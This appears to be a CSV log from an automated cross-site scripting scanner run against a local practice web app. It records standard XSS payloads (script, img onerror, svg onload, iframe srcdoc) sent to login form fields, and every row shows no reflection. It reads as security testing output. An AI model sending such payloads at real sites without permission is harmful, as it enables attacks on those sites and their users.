page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
